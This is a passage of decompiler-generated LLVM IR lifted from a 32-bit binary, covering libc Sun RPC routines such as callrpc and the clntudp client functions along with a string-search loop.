  %v6_8061ed427 = or i32 %v3_8061ed425, %v5_8061ed426
  %v4_8061ec2 = ptrtoint i8* %arg1 to i32
  %v1_8061ecd13 = inttoptr i32 %arg2 to i8*
  %v4_8061ecd.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8061eda

dec_label_pc_8061ec8:                             ; preds = %dec_label_pc_8061eda, %dec_label_pc_8061ecc
  %v6_8061ecd22 = phi i32 [ %v6_8061ecd, %dec_label_pc_8061ecc ], [ %v6_8061ecd17, %dec_label_pc_8061eda ]
  %v2_8061ecd21 = phi i8 [ %v2_8061ecd, %dec_label_pc_8061ecc ], [ %v2_8061ecd14, %dec_label_pc_8061eda ]
  %v0_8061ecc20 = phi i32 [ %v1_8061ecc, %dec_label_pc_8061ecc ], [ %arg2, %dec_label_pc_8061eda ]
  %v15_8061ec8 = icmp eq i8 %v2_8061ecd21, %v2_8061ed431
  br i1 %v15_8061ec8, label %dec_label_pc_8061ee0, label %dec_label_pc_8061ecc

dec_label_pc_8061ecc:                             ; preds = %dec_label_pc_8061ec8
  %v1_8061ecc = add i32 %v0_8061ecc20, 1
  store i32 %v1_8061ecc, i32* @edx, align 4
  %v1_8061ecd = inttoptr i32 %v1_8061ecc to i8*
  %v2_8061ecd = load i8, i8* %v1_8061ecd, align 1
  %v3_8061ecd = zext i8 %v2_8061ecd to i32
  %v5_8061ecd = and i32 %v6_8061ecd22, -256
  %v6_8061ecd = or i32 %v3_8061ecd, %v5_8061ecd
  store i32 %v6_8061ecd, i32* @ecx, align 4
  %v4_8061ecf = icmp eq i8 %v2_8061ecd, 0
  %v1_8061ed1 = icmp eq i1 %v4_8061ecf, false
  br i1 %v1_8061ed1, label %dec_label_pc_8061ec8, label %dec_label_pc_8061ed3

dec_label_pc_8061ed3:                             ; preds = %dec_label_pc_8061ecc, %dec_label_pc_8061eda
  %v4_8061ecd.pre34 = phi i32 [ %v6_8061ecd17, %dec_label_pc_8061eda ], [ %v6_8061ecd, %dec_label_pc_8061ecc ]
  %v1_8061ed3 = add i32 %v0_8061ed329, 1
  %v1_8061ed4 = inttoptr i32 %v1_8061ed3 to i8*
  %v2_8061ed4 = load i8, i8* %v1_8061ed4, align 1
  %v3_8061ed4 = zext i8 %v2_8061ed4 to i32
  %v5_8061ed4 = and i32 %v6_8061ed432, -256
  %v6_8061ed4 = or i32 %v3_8061ed4, %v5_8061ed4
  %v4_8061ed6 = icmp eq i8 %v2_8061ed4, 0
  br i1 %v4_8061ed6, label %dec_label_pc_8061ede, label %dec_label_pc_8061eda

dec_label_pc_8061eda:                             ; preds = %dec_label_pc_8061eda.lr.ph, %dec_label_pc_8061ed3
  %v4_8061ecd.pre = phi i32 [ %v4_8061ecd.pre.pre, %dec_label_pc_8061eda.lr.ph ], [ %v4_8061ecd.pre34, %dec_label_pc_8061ed3 ]
  %v6_8061ed432 = phi i32 [ %v6_8061ed427, %dec_label_pc_8061eda.lr.ph ], [ %v6_8061ed4, %dec_label_pc_8061ed3 ]
  %v2_8061ed431 = phi i8 [ %v2_8061ed424, %dec_label_pc_8061eda.lr.ph ], [ %v2_8061ed4, %dec_label_pc_8061ed3 ]
  %v0_8061ed329 = phi i32 [ %v4_8061ec2, %dec_label_pc_8061eda.lr.ph ], [ %v1_8061ed3, %dec_label_pc_8061ed3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8061ecd14 = load i8, i8* %v1_8061ecd13, align 1
  %v3_8061ecd15 = zext i8 %v2_8061ecd14 to i32
  %v5_8061ecd16 = and i32 %v4_8061ecd.pre, -256
  %v6_8061ecd17 = or i32 %v3_8061ecd15, %v5_8061ecd16
  store i32 %v6_8061ecd17, i32* @ecx, align 4
  %v4_8061ecf18 = icmp eq i8 %v2_8061ecd14, 0
  %v1_8061ed119 = icmp eq i1 %v4_8061ecf18, false
  br i1 %v1_8061ed119, label %dec_label_pc_8061ec8, label %dec_label_pc_8061ed3

dec_label_pc_8061ede:                             ; preds = %dec_label_pc_8061ed3, %entry
  br label %dec_label_pc_8061ee0

dec_label_pc_8061ee0:                             ; preds = %dec_label_pc_8061ec8, %dec_label_pc_8061ede
  %v0_8061ee2 = phi i32 [ 0, %dec_label_pc_8061ede ], [ %v0_8061ed329, %dec_label_pc_8061ec8 ]
  store i32 %v0_8061ebd, i32* @ebx, align 4
  ret i32 %v0_8061ee2

; uselistorder directives
  uselistorder i32 %v6_8061ecd17, { 2, 0, 1 }
  uselistorder i8 %v2_8061ecd14, { 1, 2, 0 }
  uselistorder i32 %v1_8061ed3, { 1, 0 }
  uselistorder i32 %v6_8061ecd, { 1, 2, 0 }
  uselistorder i8 %v2_8061ecd, { 1, 2, 0 }
  uselistorder i32 %v1_8061ecc, { 2, 1, 0 }
  uselistorder i8 %v2_8061ed424, { 0, 2, 1 }
  uselistorder i32 %v0_8061ebd, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061ee0, { 1, 0 }
  uselistorder label %dec_label_pc_8061eda, { 1, 0 }
  uselistorder label %dec_label_pc_8061ed3, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061ee4 = load i32, i32* @ebx, align 4
  store i32 %v0_8061ee4, i32* %stack_var_-4, align 4
  %v1_8061ee8 = call i32 @__rpc_thread_variables(i32 %v0_8061ee4)
  %v1_8061eed = add i32 %v1_8061ee8, 164
  %v2_8061eed = inttoptr i32 %v1_8061eed to i32*
  %v3_8061eed = load i32, i32* %v2_8061eed, align 4
  store i32 %v3_8061eed, i32* @ebx, align 4
  %v1_8061ef3 = icmp eq i32 %v3_8061eed, 0
  br i1 %v1_8061ef3, label %dec_label_pc_8061f16, label %dec_label_pc_8061ef7

dec_label_pc_8061ef7:                             ; preds = %entry
  %v1_8061ef7 = inttoptr i32 %v3_8061eed to i32*
  %v2_8061ef7 = load i32, i32* %v1_8061ef7, align 4
  %v1_8061ef9 = icmp eq i32 %v2_8061ef7, 0
  br i1 %v1_8061ef9, label %dec_label_pc_8061f0a, label %dec_label_pc_8061efd

dec_label_pc_8061efd:                             ; preds = %dec_label_pc_8061ef7
  %v1_8061f00 = add i32 %v2_8061ef7, 4
  %v2_8061f00 = inttoptr i32 %v1_8061f00 to i32*
  %v3_8061f00 = load i32, i32* %v2_8061f00, align 4
  %v5_8061f04 = add i32 %v3_8061f00, 16
  %v6_8061f04 = inttoptr i32 %v5_8061f04 to i32*
  %v7_8061f04 = load i32, i32* %v6_8061f04, align 4
  call void @__pseudo_call(i32 %v7_8061f04)
  br label %dec_label_pc_8061f0a

dec_label_pc_8061f0a:                             ; preds = %dec_label_pc_8061ef7, %dec_label_pc_8061efd
  %v1_8061f0e = call i32 @free(i32 %v3_8061eed)
  br label %dec_label_pc_8061f16

dec_label_pc_8061f16:                             ; preds = %entry, %dec_label_pc_8061f0a
  %v2_8061f16 = load i32, i32* %stack_var_-12, align 4
  %v2_8061f18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061f18, i32* @ebx, align 4
  ret i32 %v2_8061f16

; uselistorder directives
  uselistorder i32 %v3_8061eed, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8061f16, { 1, 0 }
  uselistorder label %dec_label_pc_8061f0a, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-1136 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v1_8061f3f = call i32 @__rpc_thread_variables(i32 0)
  store i32 %v1_8061f3f, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %v1_8061f3f, i32* @ebx, align 4
  %v1_8061f49 = add i32 %v1_8061f3f, 164
  %v2_8061f49 = inttoptr i32 %v1_8061f49 to i32*
  %v3_8061f49 = load i32, i32* %v2_8061f49, align 4
  store i32 %v3_8061f49, i32* @esi, align 4
  %v1_8061f4f = icmp eq i32 %v3_8061f49, 0
  %v1_8061f51 = icmp eq i1 %v1_8061f4f, false
  br i1 %v1_8061f51, label %dec_label_pc_8061f73, label %dec_label_pc_8061f53

dec_label_pc_8061f53:                             ; preds = %entry
  %v5_8061f59 = call i32 @calloc(i64 1, i32 24, i32 %v1_8061f3f, i32 %v1_8061f3f)
  store i32 %v5_8061f59, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8061f65 = icmp eq i32 %v5_8061f59, 0
  br i1 %v1_8061f65, label %dec_label_pc_8062124, label %dec_label_pc_8061f6d

dec_label_pc_8061f6d:                             ; preds = %dec_label_pc_8061f53
  %v1_8061f6d = load i32, i32* @ebx, align 4
  %v2_8061f6d = add i32 %v1_8061f6d, 164
  %v3_8061f6d = inttoptr i32 %v2_8061f6d to i32*
  store i32 %v5_8061f59, i32* %v3_8061f6d, align 4
  %v0_8061f73.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8061f73

dec_label_pc_8061f73:                             ; preds = %entry, %dec_label_pc_8061f6d
  %v0_8061f73 = phi i32 [ %v3_8061f49, %entry ], [ %v0_8061f73.pre, %dec_label_pc_8061f6d ]
  %v1_8061f73 = add i32 %v0_8061f73, 20
  %v2_8061f73 = inttoptr i32 %v1_8061f73 to i32*
  %v3_8061f73 = load i32, i32* %v2_8061f73, align 4
  %v4_8061f73 = icmp eq i32 %v3_8061f73, 0
  %v1_8061f77 = icmp eq i1 %v4_8061f73, false
  br i1 %v1_8061f77, label %dec_label_pc_8061f96, label %dec_label_pc_8061f79

dec_label_pc_8061f79:                             ; preds = %dec_label_pc_8061f73
  %v1_8061f81 = call i32 @malloc(i32 256)
  %v2_8061f81 = inttoptr i32 %v1_8061f81 to i8*
  store i32 %v1_8061f81, i32* %eax.global-to-local, align 4
  %v2_8061f89 = load i32, i32* @esi, align 4
  %v3_8061f89 = add i32 %v2_8061f89, 20
  %v4_8061f89 = inttoptr i32 %v3_8061f89 to i32*
  store i32 %v1_8061f81, i32* %v4_8061f89, align 4
  store i8 0, i8* %v2_8061f81, align 1
  %v0_8061f8f = load i32, i32* @esi, align 4
  %v1_8061f8f = add i32 %v0_8061f8f, 4
  %v2_8061f8f = inttoptr i32 %v1_8061f8f to i32*
  store i32 -1, i32* %v2_8061f8f, align 4
  %v0_8061f96.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8061f96

dec_label_pc_8061f96:                             ; preds = %dec_label_pc_8061f73, %dec_label_pc_8061f79
  %v0_8061fae = phi i32 [ %v0_8061f73, %dec_label_pc_8061f73 ], [ %v0_8061f96.pre, %dec_label_pc_8061f79 ]
  %v1_8061f96 = add i32 %v0_8061fae, 16
  %v2_8061f96 = inttoptr i32 %v1_8061f96 to i32*
  %v3_8061f96 = load i32, i32* %v2_8061f96, align 4
  %v4_8061f96 = icmp eq i32 %v3_8061f96, 0
  br i1 %v4_8061f96, label %dec_label_pc_8061fc1, label %dec_label_pc_8061f9c

dec_label_pc_8061f9c:                             ; preds = %dec_label_pc_8061f96
  %v1_8061f9c = add i32 %v0_8061fae, 8
  %v2_8061f9c = inttoptr i32 %v1_8061f9c to i32*
  %v3_8061f9c = load i32, i32* %v2_8061f9c, align 4
  %v4_8061f9c = load i32, i32* @edi, align 4
  %v15_8061f9c = icmp eq i32 %v3_8061f9c, %v4_8061f9c
  %v1_8061f9f = icmp eq i1 %v15_8061f9c, false
  br i1 %v1_8061f9f, label %dec_label_pc_8061fc1, label %dec_label_pc_8061fa1

dec_label_pc_8061fa1:                             ; preds = %dec_label_pc_8061f9c
  store i32 %arg3, i32* @eax, align 4
  %v1_8061fa4 = add i32 %v0_8061fae, 12
  %v2_8061fa4 = inttoptr i32 %v1_8061fa4 to i32*
  %v3_8061fa4 = load i32, i32* %v2_8061fa4, align 4
  %v15_8061fa4 = icmp eq i32 %v3_8061fa4, %arg3
  %v1_8061fa7 = icmp eq i1 %v15_8061fa4, false
  br i1 %v1_8061fa7, label %dec_label_pc_8061fc1, label %dec_label_pc_8061fa9

dec_label_pc_8061fa9:                             ; preds = %dec_label_pc_8061fa1
  %v1_8061fae = add i32 %v0_8061fae, 20
  %v2_8061fae = inttoptr i32 %v1_8061fae to i32*
  %v3_8061fae = load i32, i32* %v2_8061fae, align 4
  %v3_8061fb1 = inttoptr i32 %v3_8061fae to i8*
  %v4_8061fb1 = call i32 @__GI_strcoll(i8* %v3_8061fb1, i32 %arg1, i32 %arg3)
  store i32 %v4_8061fb1, i32* %eax.global-to-local, align 4
  %v1_8061fb9 = icmp eq i32 %v4_8061fb1, 0
  br i1 %v1_8061fb9, label %dec_label_pc_80620e4, label %dec_label_pc_8061fa9.dec_label_pc_8061fc1_crit_edge

dec_label_pc_8061fa9.dec_label_pc_8061fc1_crit_edge: ; preds = %dec_label_pc_8061fa9
  %v0_8061fc1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8061fc1

dec_label_pc_8061fc1:                             ; preds = %dec_label_pc_8061fa9.dec_label_pc_8061fc1_crit_edge, %dec_label_pc_8061fa1, %dec_label_pc_8061f9c, %dec_label_pc_8061f96
  %v0_8061fc1 = phi i32 [ %v0_8061fc1.pre, %dec_label_pc_8061fa9.dec_label_pc_8061fc1_crit_edge ], [ %v0_8061fae, %dec_label_pc_8061fa1 ], [ %v0_8061fae, %dec_label_pc_8061f9c ], [ %v0_8061fae, %dec_label_pc_8061f96 ]
  %v1_8061fc1 = add i32 %v0_8061fc1, 4
  %v2_8061fc1 = inttoptr i32 %v1_8061fc1 to i32*
  %v3_8061fc1 = load i32, i32* %v2_8061fc1, align 4
  store i32 %v3_8061fc1, i32* %eax.global-to-local, align 4
  %v1_8061fc4 = add i32 %v0_8061fc1, 16
  %v2_8061fc4 = inttoptr i32 %v1_8061fc4 to i32*
  store i32 0, i32* %v2_8061fc4, align 4
  %v0_8061fcb = load i32, i32* %eax.global-to-local, align 4
  %v10_8061fcb = icmp eq i32 %v0_8061fcb, -1
  br i1 %v10_8061fcb, label %dec_label_pc_8061fe3, label %dec_label_pc_8061fd0

dec_label_pc_8061fd0:                             ; preds = %dec_label_pc_8061fc1
  %v1_8061fd4 = call i32 @__libc_close(i32 %v0_8061fcb)
  store i32 %v1_8061fd4, i32* %eax.global-to-local, align 4
  %v0_8061fd9 = load i32, i32* @esi, align 4
  %v1_8061fd9 = add i32 %v0_8061fd9, 4
  %v2_8061fd9 = inttoptr i32 %v1_8061fd9 to i32*
  store i32 -1, i32* %v2_8061fd9, align 4
  br label %dec_label_pc_8061fe3

dec_label_pc_8061fe3:                             ; preds = %dec_label_pc_8061fc1, %dec_label_pc_8061fd0
  %v0_8061fe3 = load i32, i32* @esi, align 4
  %v1_8061fe3 = inttoptr i32 %v0_8061fe3 to i32*
  %v2_8061fe3 = load i32, i32* %v1_8061fe3, align 4
  %v1_8061fe5 = icmp eq i32 %v2_8061fe3, 0
  br i1 %v1_8061fe5, label %dec_label_pc_8061ffc, label %dec_label_pc_8061fe9

dec_label_pc_8061fe9:                             ; preds = %dec_label_pc_8061fe3
  %v1_8061fec = add i32 %v2_8061fe3, 4
  %v2_8061fec = inttoptr i32 %v1_8061fec to i32*
  %v3_8061fec = load i32, i32* %v2_8061fec, align 4
  store i32 %v3_8061fec, i32* %eax.global-to-local, align 4
  store i32 134619123, i32* %stack_var_-112, align 4
  %v5_8061ff0 = add i32 %v3_8061fec, 16
  %v6_8061ff0 = inttoptr i32 %v5_8061ff0 to i32*
  %v7_8061ff0 = load i32, i32* %v6_8061ff0, align 4
  call void @__pseudo_call(i32 %v7_8061ff0)
  %v0_8061ff3 = load i32, i32* @esi, align 4
  %v1_8061ff3 = inttoptr i32 %v0_8061ff3 to i32*
  store i32 0, i32* %v1_8061ff3, align 4
  br label %dec_label_pc_8061ffc

dec_label_pc_8061ffc:                             ; preds = %dec_label_pc_8061fe3, %dec_label_pc_8061fe9
  %v12_8061ffc = ptrtoint i32* %stack_var_-1136 to i32
  store i32 1024, i32* @ebx, align 4
  %v2_806203b = ptrtoint i32* %stack_var_-28 to i32
  %v2_806203f = ptrtoint i32* %stack_var_-24 to i32
  %v2_8062043 = ptrtoint i32* %stack_var_-64 to i32
  %v0_8062039.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062039

dec_label_pc_8062010:                             ; preds = %dec_label_pc_8062058, %dec_label_pc_8062039
  %v3_8062010 = load i32, i32* %stack_var_-28, align 4
  %v13_8062010 = icmp eq i32 %v3_8062010, -1
  %v1_8062014 = icmp eq i1 %v13_8062010, false
  br i1 %v1_8062014, label %dec_label_pc_806211f, label %dec_label_pc_806201a

dec_label_pc_806201a:                             ; preds = %dec_label_pc_8062010
  %v0_806201a = load i32, i32* %stack_var_-112, align 4
  %v1_806201a = call i32 @__errno_location(i32 %v0_806201a)
  store i32 %v1_806201a, i32* %eax.global-to-local, align 4
  %v1_806201f = inttoptr i32 %v1_806201a to i32*
  %v2_806201f = load i32, i32* %v1_806201f, align 4
  %v11_806201f = icmp eq i32 %v2_806201f, 34
  %v1_8062022 = icmp eq i1 %v11_806201f, false
  br i1 %v1_8062022, label %dec_label_pc_806211f, label %dec_label_pc_8062028

dec_label_pc_8062028:                             ; preds = %dec_label_pc_806201a
  %v0_8062028 = load i32, i32* @ebx, align 4
  %v2_8062028 = mul i32 %v0_8062028, 2
  store i32 %v2_8062028, i32* @ebx, align 4
  %v1_806202a = add i32 %v2_8062028, 30
  %v1_806202d = and i32 %v1_806202a, -16
  store i32 %v1_806202d, i32* %eax.global-to-local, align 4
  %v0_8062030 = load i32, i32* @esp, align 4
  %v2_8062030 = sub i32 %v0_8062030, %v1_806202d
  %v1_8062032 = add i32 %v2_8062030, 15
  %v1_8062036 = and i32 %v1_8062032, -16
  br label %dec_label_pc_8062039

dec_label_pc_8062039:                             ; preds = %dec_label_pc_8061ffc, %dec_label_pc_8062028
  %v0_8062046 = phi i32 [ 1024, %dec_label_pc_8061ffc ], [ %v2_8062028, %dec_label_pc_8062028 ]
  %v0_8062039 = phi i32 [ %v0_8062039.pre, %dec_label_pc_8061ffc ], [ %v1_806202d, %dec_label_pc_8062028 ]
  %storemerge = phi i32 [ %v12_8061ffc, %dec_label_pc_8061ffc ], [ %v1_8062036, %dec_label_pc_8062028 ]
  store i32 %v2_8062043, i32* %eax.global-to-local, align 4
  %v8_806204c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-64, i32 %storemerge, i32 %v0_8062046, i32 %v2_806203f, i32 %v2_806203b, i32 %v0_8062039)
  store i32 %v8_806204c, i32* %eax.global-to-local, align 4
  %v1_8062054 = icmp eq i32 %v8_806204c, 0
  %v1_8062056 = icmp eq i1 %v1_8062054, false
  br i1 %v1_8062056, label %dec_label_pc_8062010, label %dec_label_pc_8062058

dec_label_pc_8062058:                             ; preds = %dec_label_pc_8062039
  %v3_8062058 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8062058, i32* %eax.global-to-local, align 4
  %v1_806205b = icmp eq i32 %v3_8062058, 0
  br i1 %v1_806205b, label %dec_label_pc_8062010, label %dec_label_pc_806205f

dec_label_pc_806205f:                             ; preds = %dec_label_pc_8062058
  %v1_8062071 = add i32 %v3_8062058, 12
  %v2_8062071 = inttoptr i32 %v1_8062071 to i32*
  %v3_8062071 = load i32, i32* %v2_8062071, align 4
  %v1_8062074 = add i32 %v3_8062058, 16
  %v2_8062074 = inttoptr i32 %v1_8062074 to i32*
  %v3_8062074 = load i32, i32* %v2_8062074, align 4
  store i32 %v3_8062074, i32* %eax.global-to-local, align 4
  %v2_8062077 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8062077, i32* @ebx, align 4
  %v1_806207a = inttoptr i32 %v3_8062074 to i32*
  %v2_806207a = load i32, i32* %v1_806207a, align 4
  %v3_806207d = bitcast i32* %stack_var_-40 to i16*
  %v4_806207d = call i32 @memcpy(i16* %v3_806207d, i32 %v2_806207a, i32 %v3_8062071)
  %v0_8062083 = load i32, i32* @esi, align 4
  %v1_8062083 = add i32 %v0_8062083, 4
  store i32 %v1_8062083, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_806209d = load i32, i32* @edi, align 4
  %v6_806209f = call i32 @__GI_clntudp_create(i32 %v2_8062077, i32 %v0_806209d, i32 %arg3, i32 5, i32 0, i32 %v1_8062083)
  store i32 %v6_806209f, i32* %eax.global-to-local, align 4
  %v1_80620a7 = load i32, i32* @esi, align 4
  %v2_80620a7 = inttoptr i32 %v1_80620a7 to i32*
  store i32 %v6_806209f, i32* %v2_80620a7, align 4
  %v1_80620a9 = icmp eq i32 %v6_806209f, 0
  %v1_80620ab = icmp eq i1 %v1_80620a9, false
  br i1 %v1_80620ab, label %dec_label_pc_80620b6, label %dec_label_pc_80620ad

dec_label_pc_80620ad:                             ; preds = %dec_label_pc_806205f
  %v0_80620ad = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80620ad, i32* %eax.global-to-local, align 4
  %v1_80620b2 = inttoptr i32 %v0_80620ad to i32*
  %v2_80620b2 = load i32, i32* %v1_80620b2, align 4
  store i32 %v2_80620b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062124

dec_label_pc_80620b6:                             ; preds = %dec_label_pc_806205f
  %v0_80620b6 = load i32, i32* @esi, align 4
  %v1_80620b6 = add i32 %v0_80620b6, 16
  %v2_80620b6 = inttoptr i32 %v1_80620b6 to i32*
  store i32 1, i32* %v2_80620b6, align 4
  %v0_80620bd = load i32, i32* @edi, align 4
  %v1_80620bd = load i32, i32* @esi, align 4
  %v2_80620bd = add i32 %v1_80620bd, 8
  %v3_80620bd = inttoptr i32 %v2_80620bd to i32*
  store i32 %v0_80620bd, i32* %v3_80620bd, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_80620c3 = load i32, i32* @esi, align 4
  %v2_80620c3 = add i32 %v1_80620c3, 12
  %v3_80620c3 = inttoptr i32 %v2_80620c3 to i32*
  store i32 %arg3, i32* %v3_80620c3, align 4
  %v0_80620cf = load i32, i32* @esi, align 4
  %v1_80620cf = add i32 %v0_80620cf, 20
  %v2_80620cf = inttoptr i32 %v1_80620cf to i32*
  %v3_80620cf = load i32, i32* %v2_80620cf, align 4
  %v3_80620d2 = inttoptr i32 %v3_80620cf to i8*
  %v4_80620d2 = call i32 @strncpy(i8* %v3_80620d2, i32 %arg1, i32 255)
  store i32 %v4_80620d2, i32* %eax.global-to-local, align 4
  %v0_80620d7 = load i32, i32* @esi, align 4
  %v1_80620d7 = add i32 %v0_80620d7, 20
  %v2_80620d7 = inttoptr i32 %v1_80620d7 to i32*
  %v3_80620d7 = load i32, i32* %v2_80620d7, align 4
  store i32 %v3_80620d7, i32* %eax.global-to-local, align 4
  %v1_80620dd = add i32 %v3_80620d7, 255
  %v2_80620dd = inttoptr i32 %v1_80620dd to i8*
  store i8 0, i8* %v2_80620dd, align 1
  br label %dec_label_pc_80620e4

dec_label_pc_80620e4:                             ; preds = %dec_label_pc_8061fa9, %dec_label_pc_80620b6
  %v0_80620f2 = load i32, i32* @esi, align 4
  %v1_80620f2 = inttoptr i32 %v0_80620f2 to i32*
  %v2_80620f2 = load i32, i32* %v1_80620f2, align 4
  store i32 %v2_80620f2, i32* %eax.global-to-local, align 4
  %v1_80620f4 = add i32 %v2_80620f2, 4
  %v2_80620f4 = inttoptr i32 %v1_80620f4 to i32*
  %v3_80620f4 = load i32, i32* %v2_80620f4, align 4
  store i32 %arg6, i32* %stack_var_-112, align 4
  %v5_806210d = inttoptr i32 %v3_80620f4 to i32*
  %v6_806210d = load i32, i32* %v5_806210d, align 4
  call void @__pseudo_call(i32 %v6_806210d)
  %v0_8062112 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062112 = icmp eq i32 %v0_8062112, 0
  br i1 %v1_8062112, label %dec_label_pc_8062124, label %dec_label_pc_8062116

dec_label_pc_8062116:                             ; preds = %dec_label_pc_80620e4
  %v0_8062116 = load i32, i32* @esi, align 4
  %v1_8062116 = add i32 %v0_8062116, 16
  %v2_8062116 = inttoptr i32 %v1_8062116 to i32*
  store i32 0, i32* %v2_8062116, align 4
  %v0_806212b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062124

dec_label_pc_806211f:                             ; preds = %dec_label_pc_806201a, %dec_label_pc_8062010
  store i32 13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062124

dec_label_pc_8062124:                             ; preds = %dec_label_pc_80620e4, %dec_label_pc_8061f53, %dec_label_pc_8062116, %dec_label_pc_80620ad, %dec_label_pc_806211f
  %v0_806212b = phi i32 [ 0, %dec_label_pc_80620e4 ], [ 0, %dec_label_pc_8061f53 ], [ %v0_806212b.pre, %dec_label_pc_8062116 ], [ %v2_80620b2, %dec_label_pc_80620ad ], [ 13, %dec_label_pc_806211f ]
  ret i32 %v0_806212b

; uselistorder directives
  uselistorder i32 %v2_8062028, { 2, 1, 0 }
  uselistorder i32 %v0_8061fcb, { 1, 0 }
  uselistorder i32 %v0_8061fc1, { 1, 0 }
  uselistorder i32 %v1_8061f81, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 20, 17, 18, 19, 21, 22, 23, 24, 25 }
  uselistorder i32 %arg3, { 5, 4, 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8062124, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_80620e4, { 1, 0 }
  uselistorder label %dec_label_pc_8062039, { 1, 0 }
  uselistorder label %dec_label_pc_8061ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8061fe3, { 1, 0 }
  uselistorder label %dec_label_pc_8061f96, { 1, 0 }
  uselistorder label %dec_label_pc_8061f73, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8062133 = add i32 %arg1, 8
  %v2_8062133 = inttoptr i32 %v1_8062133 to i32*
  %v3_8062133 = load i32, i32* %v2_8062133, align 4
  %v1_8062138 = add i32 %v3_8062133, 44
  %v3_8062140 = inttoptr i32 %arg2 to i16*
  %v4_8062140 = call i32 @memcpy(i16* %v3_8062140, i32 %v1_8062138, i32 12)
  ret i32 %v4_8062140
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8062155 = add i32 %arg1, 8
  %v2_8062155 = inttoptr i32 %v1_8062155 to i32*
  %v3_8062155 = load i32, i32* %v2_8062155, align 4
  %v1_8062158 = add i32 %v3_8062155, 56
  %v1_806215b = inttoptr i32 %v1_8062158 to i32*
  store i32 2, i32* %v1_806215b, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_8062158
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_806216b = load i32, i32* @eax, align 4
  ret i32 %v0_806216b
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg3 to i32
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  %v1_8062178 = add i32 %arg1, 8
  %v2_8062178 = inttoptr i32 %v1_8062178 to i32*
  %v3_8062178 = load i32, i32* %v2_8062178, align 4
  store i32 %v3_8062178, i32* %ecx.global-to-local, align 4
  switch i32 %arg2, label %dec_label_pc_806218c [
    i32 1, label %dec_label_pc_80621ab
    i32 2, label %dec_label_pc_80621b8
    i32 3, label %dec_label_pc_80621da
    i32 4, label %dec_label_pc_80621c0
    i32 5, label %dec_label_pc_80621cd
    i32 6, label %dec_label_pc_80621f1
    i32 8, label %dec_label_pc_8062193
    i32 9, label %dec_label_pc_806219f
    i32 10, label %dec_label_pc_80621f5
    i32 11, label %dec_label_pc_80621fe
    i32 12, label %dec_label_pc_8062208
    i32 13, label %dec_label_pc_8062212
    i32 14, label %dec_label_pc_806221e
    i32 15, label %dec_label_pc_806222a
  ]

dec_label_pc_806218c:                             ; preds = %entry
  br label %dec_label_pc_8062239

dec_label_pc_8062193:                             ; preds = %entry
  %v1_8062193 = add i32 %v3_8062178, 4
  %v2_8062193 = inttoptr i32 %v1_8062193 to i32*
  store i32 1, i32* %v2_8062193, align 4
  br label %dec_label_pc_8062234

dec_label_pc_806219f:                             ; preds = %entry
  %v1_806219f = add i32 %v3_8062178, 4
  %v2_806219f = inttoptr i32 %v1_806219f to i32*
  store i32 0, i32* %v2_806219f, align 4
  br label %dec_label_pc_8062234

dec_label_pc_80621ab:                             ; preds = %entry
  %v2_80621ab = load i32, i32* %arg3, align 4
  store i32 %v2_80621ab, i32* %edx.global-to-local, align 4
  %v1_80621ad = add i32 %tmp7, 4
  %v2_80621ad = inttoptr i32 %v1_80621ad to i32*
  %v3_80621ad = load i32, i32* %v2_80621ad, align 4
  %v2_80621b0 = add i32 %v3_8062178, 40
  %v3_80621b0 = inttoptr i32 %v2_80621b0 to i32*
